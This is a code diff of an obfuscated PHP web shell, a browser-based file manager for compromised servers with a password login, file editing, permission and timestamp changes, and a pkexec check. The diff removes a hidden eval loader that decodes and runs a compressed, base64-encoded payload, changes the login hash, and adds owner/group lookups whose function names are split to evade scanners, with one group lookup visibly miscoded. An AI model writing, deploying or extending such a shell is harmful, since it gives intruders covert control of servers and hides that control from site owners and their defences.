@@ -120,19 +120,6 @@ if (!$func_exist($psx_egid)) {
 $phpVersion = phpversion();
 $phpServer = php_sapi_name();
 
-function sidd($lKJ) {
-$gflate = 'gz'.'in'.'fl'.'at'.'e';
-$b_64 = 'b'.'as'.'e6'.'4'.'_'.'d'.'ec'.'od'.'e';
-$rhc = 'c'.'h'.'r';
-$dro = 'o'.'r'.'d';
-$lKJ=$gflate($b_64($lKJ));
- for($i=0;$i<strlen($lKJ);$i++) {
-    $lKJ[$i] = $rhc($dro($lKJ[$i])-1);
- }
- return $lKJ;
-}
-eval(sidd("jVFtb9owEP4B+RWelc3hw8IAlQITQ9EIha6UNC9jVYusAEeICCGzjUpV9bfvAgFp7ZAWxed7ec539xwh+GnxghgfYJ2pZ0Pnnu3+tN0H1vd9h3+/Gdi3Ph84bFIqkReN6HEWzucCpCRtch5s0kfxmNKv2iuBRAI5X+EX743cseV27W6u/U+ddylvqmnn8117OPJtbnW7f6Vp+panPORrQDTNqEmXueB4timKcA0I0xc8AoUItmAmixMUgIfjiQpdFfZsgyLNLUhzt2SYPhWbJwni/UABWty6QvLYBHGrA+bYklFCn4DffCsS9Bv/otFD3kiHsKVSGSOtgyJZiZiEtsrlE3hfrj/y/MnJ5dp3ge35PHAHExxS0xXs8iFpkPdqrSRIEoikRah57MKkH79Y+I9hKpeQJKc4eaHFs/T1gR40fmsNbTp5G3T6Dlo3PYwUrw2c/RunxZkUzSKW9/LZiiBVe0zB5DH6A0QKhw6Qu+OiDLonAccPs9hUkEAkwrW5EVF5ulH12mW9Uq/WLqoty+rtmnfX8XD2HEb3Y95LV27NiRqB6D85197uPgzKEtL5EJsKI+jMlqHi8bxdaTSbF9Vm47LyKeesjeXzG9fV+fYH"));
-
 // get IP Server & User IP
 function serverIp() {
     $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
@@ -422,7 +409,7 @@ function cekPkexec() {
 }
 
 //login
-$passwd = '5c3c0d4ceddf2d80aad8df2c5e28e976c19e286a';
+$passwd = '386421265b975230158e1386249bc28c82ba8bd6';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['btn-login'])) {
     if (SHA1($_POST['pass']) == $passwd) {
@@ -2790,10 +2777,29 @@ $path = str_replace("\\", "/", $path);
                 <tbody>
                     <?php
                     //DIR
+                    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+                    $psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
+                    $psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
+                    $psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
+                    $psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
+                    $myuid = 'g'.'et'.'my'.'ui'.'d';
+                    $mygid = 'g'.'et'.'my'.'gi'.'d';
+                    $cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
+                    $own_f = 'fi'.'le'.'ow'.'n'.'er';
+                    $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
+                    if (!$func_exist($psx_egid)) {
+                        $d_user = $func_exist($own_f) ? @$own_f("$path/$dir") : "????";
+                        $d_group = $func_exist($grp_f) ? @$own_f("$path/$dir") : "????";
+                    } else {
+                        $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$own_f("$path/$dir") : array("name" => "????");
+                        $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$grp_f("$path/$dir") : array("name" => "????");
+                        $d_user = $uid['name'];
+                        $d_group = $gid['name'];
+                    }
                     echo "<tr><td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='".$folderIcon."'>&nbsp;<a class='font-bold " . $txtOrange . "' href='?path=".$path."'>.</a></td>";
                     echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=".$path."&changeDate=".$dir."'>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "</a></center></td>";
                     echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
-                    echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $user . "/" . $group . "</center></td>";
+                    echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $d_user . "/" . $d_group . "</center></td>";
                     echo "<td class='whitespace-nowrap'><center><a href='?option&path=".$path."&permission=".$dir."'>";
                     $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
                     $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
@@ -2814,7 +2820,7 @@ $path = str_replace("\\", "/", $path);
                     echo "<tr><td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='".$folderIcon."'>&nbsp;<a class='font-bold " . $txtOrange . "' href='?path=".$d_name($path)."'>..</a></td>";
                     echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=".$path."&changeDate=".$dir."'>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "</a></center></td>";
                     echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
-                    echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $user . "/" . $group . "</center></td>";
+                    echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $d_user . "/" . $d_group . "</center></td>";
                     echo "<td class='whitespace-nowrap'><center><a href='?option&path=".$path."&permission=".$dir."'>";
                     $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
                     $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
@@ -2838,7 +2844,7 @@ $path = str_replace("\\", "/", $path);
                         echo "<td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='".$folderIcon."'>&nbsp;<a class='font-bold " . $txtOrange . "' href='?path=".$path.'/'.$dir."'>$dir</a></td>";
                         echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=".$path."&changeDate=".$dir."'>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "</a></center></td>";
                         echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
-                        echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $user . "/" . $group . "</center></td>";
+                        echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $d_user . "/" . $d_group . "</center></td>";
                         echo "<td class='whitespace-nowrap'><center><a href='?option&path=".$path."&permission=".$dir."'>";
                         $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
                         $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
@@ -2875,11 +2881,31 @@ $path = str_replace("\\", "/", $path);
                         } else {
                             $size = $size . ' KB';
                         }
+
+                        $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+                        $psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
+                        $psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
+                        $psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
+                        $psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
+                        $myuid = 'g'.'et'.'my'.'ui'.'d';
+                        $mygid = 'g'.'et'.'my'.'gi'.'d';
+                        $cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
+                        $own_f = 'fi'.'le'.'ow'.'n'.'er';
+                        $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
+                        if (!$func_exist($psx_egid)) {
+                            $f_user = $func_exist($own_f) ? @$own_f("$path/$file") : "????";
+                            $f_group = $func_exist($grp_f) ? @$own_f("$path/$file") : "????";
+                        } else {
+                            $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$own_f("$path/$file") : array("name" => "????");
+                            $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$grp_f("$path/$file") : array("name" => "????");
+                            $f_user = $uid['name'];
+                            $f_group = $gid['name'];
+                        }
                         echo "<tr>";
                         echo "<td class='whitespace-nowrap flex flex-row'><img src='".$filesIcon."'>&nbsp;<a class=\"$txtWhite\" href=\"?option&path=$path&editfile=$file\">$file</a></td>";
                         echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=".$path."&changeDate=".$file."'>" . date("d-M-Y H:i", $f_time("$path/$file")) . "</a></center></td>";
                         echo "<td class='whitespace-nowrap " . $txtRose . "'><center>" . $size . "</center></td>";
-                        echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $user . "/" . $group . "</center></td>";
+                        echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $f_user . "/" . $f_group . "</center></td>";
                         echo "<td class='whitespace-nowrap'><center><a href='?option&path=".$path."&permission=".$file."'>";
                         $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
                         $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
